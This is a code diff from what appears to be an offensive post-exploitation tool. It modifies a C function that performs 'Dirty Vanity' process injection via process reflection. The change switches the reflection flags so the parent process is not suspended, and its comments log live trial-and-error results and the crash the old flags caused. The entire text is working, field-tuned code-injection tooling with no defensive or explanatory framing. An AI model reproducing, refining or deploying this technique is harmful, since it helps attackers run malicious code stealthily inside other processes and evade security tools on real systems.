@@ -268,12 +268,14 @@ BOOL inject_via_dirtyvanity_reflect(INJECTCONTEXT * context, LPVOID lpStartAddre
 		return FALSE;
 
 	ZeroMemory(&info, sizeof(info));
-	/* flags: INHERIT_HANDLES only. The SUSPENDED/NO_SYNCHRONIZE combos the
-	 * public PoCs use are rejected on this build (live matrix: 3 -> 0xC00000F0
-	 * INVALID_PARAMETER_2, 0xA -> 0xC00000F3 with and without an event;
-	 * plain 0x2 returns STATUS_SUCCESS). Struct per phnt: thread handle
-	 * first, then the CLIENT_ID - logged only, nothing depends on it. */
-	st = pReflect(GetCurrentProcess(), 0x2, lpStartAddress, lpParameter, NULL, &info);
+	/* flags: INHERIT_HANDLES | NO_SUSPEND. Live matrix on this build:
+	 * 0x2 succeeds but suspends the parent during the snapshot - resuming
+	 * a thread parked inside an RPC wait corrupts the runtime and the
+	 * parent fastfails in RPCRT4 right after (observed live). 0x6 skips
+	 * the parent suspension entirely. Every NO_SYNCHRONIZE (0x8) combo
+	 * returns 0xC00000F3 even with an event handle; 0x1/0x3 -> 0xC00000F0.
+	 * Struct per phnt: thread handle first, then the CLIENT_ID. */
+	st = pReflect(GetCurrentProcess(), 0x2 | 0x4, lpStartAddress, lpParameter, NULL, &info);
 	if (st != 0) {
 		spawn_log("dv: reflection failed st=", (long)st);
 		post_error_d(0x4a, (int)st);
